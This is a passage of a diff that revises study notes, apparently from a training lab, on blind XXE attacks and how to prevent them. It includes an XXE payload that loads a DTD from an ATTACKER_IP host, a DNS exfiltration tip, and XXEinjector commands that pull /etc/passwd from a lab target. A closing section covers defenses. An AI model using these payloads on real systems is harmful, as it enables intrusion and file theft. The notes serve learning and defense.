 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE email [
+<!DOCTYPE email [ 
   <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
   %remote;
   %oob;
@@ -585,61 +450,43 @@ Trigger payload:
 <root>&content;</root>
 ```
 
-Tip: DNS OOB variant — put encoded data as subdomain (`ENCODEDTEXT.attacker.com`), capture with `tcpdump`.
+The PHP dev server log shows the hit and prints decoded /etc/passwd. Variant: DNS OOB exfiltration — encoded data as a subdomain (`ENCODEDTEXT.our.website.com`), captured with tcpdump; more setup, sometimes the only way out.
 
-### Automated OOB Exfiltration
-
-Tool: **XXEinjector**
+**Automated OOB** — XXEinjector covers basic XXE, CDATA, error-based, and blind OOB:
 
 ```bash
 git clone https://github.com/enjoiz/XXEinjector.git
 ```
 
-Save raw request to file, only first line + `XXEINJECT` marker (no full XML body):
+Copy the Burp request into a file, keep only the XML's first line, and mark the injection position with `XXEINJECT`:
 
-```
+```text
 POST /blind/submitDetails.php HTTP/1.1
-Host: <TARGET_IP>
-Content-Length: 169
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
-Content-Type: text/plain;charset=UTF-8
-Accept: */*
-Origin: http://<TARGET_IP>
-Referer: http://<TARGET_IP>/blind/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Connection: close
+Host: 10.129.201.94
+...SNIP...
 
+<?xml version="1.0" encoding="UTF-8"?>
 XXEINJECT
 ```
 
 Run:
 
 ```bash
-ruby XXEinjector.rb --host=<ATTACKER_IP> --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
 ```
 
-Exfiltrated files land in `Logs/<TARGET_IP>/...` under tool dir (base64, decoded on read):
+Data doesn't print (it's base64) — exfiltrated files land in `Logs/<ip>/<path>`:
 
 ```bash
-cat Logs/<TARGET_IP>/etc/passwd.log
+cat Logs/10.129.201.94/etc/passwd.log
 ```
 
 ## XXE Prevention
 
-### Avoiding Outdated Components
+Easier than most web vulns — root cause is usually outdated libraries, not developer-supplied code.
 
-Most XXE bugs = outdated XML libs, not manual dev sanitization gaps (unlike XSS/IDOR/SQLi). Example: PHP's `libxml_disable_entity_loader` deprecated since PHP 8.0, unsafe. Also update SOAP/API libs, SVG/PDF processors — anything parsing XML.
+**Avoid outdated components** — XML parsing is handled by libraries, not hand-written. Update them. PHP's `libxml_disable_entity_loader` is deprecated since 8.0 (it enabled external entities unsafely; editors like VSCode flag it). OWASP's XXE Prevention Cheat Sheet catalogs vulnerable libraries with safe replacements. Also update everything else that parses XML: SOAP API libraries, SVG processors, PDF processors — and generally outdated components (Node modules etc.).
 
-Reference: OWASP XXE Prevention Cheat Sheet.
+**Safe XML configurations** — on top of updated libraries: disable custom DTD references, external XML entities, Parameter Entity processing, XInclude support, and entity reference loops. Proper exception handling + no runtime error display (kills error-based XXE). These are workarounds/defense-in-depth, not a substitute for fixed libraries.
 
-### Using Safe XML Configurations
-
-- Disable custom DTDs
-- Disable External XML Entities
-- Disable Parameter Entity processing
-- Disable XInclude support
-- Prevent Entity Reference Loops
-- Disable runtime error display (mitigates error-based XXE)
-- Prefer JSON/YAML + REST over XML/SOAP where possible
-- WAF as extra layer only — never sole defense
+Where possible, drop XML entirely for JSON/YAML, avoid XML-based API standards (SOAP) in favor of JSON APIs (REST). WAF adds another layer — never rely on it alone; WAFs get bypassed.
